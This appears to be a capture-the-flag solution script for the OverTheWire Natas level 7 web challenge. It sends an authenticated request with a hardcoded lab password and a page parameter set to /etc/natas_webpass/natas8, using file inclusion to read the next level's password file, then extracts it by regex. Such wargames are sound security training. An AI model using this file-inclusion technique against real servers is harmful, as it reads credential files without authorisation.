import re
import requests

level = 7
creds = ('natas7','7z3hEENjQtflzgnT29q7wAvMNfZdh0i9')
url   = 'http://natas%s.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8' % level

session = requests.Session()
response = session.get(url,auth=creds)
data = response.text

print(re.findall('<br>\n(.*)\n\n',data))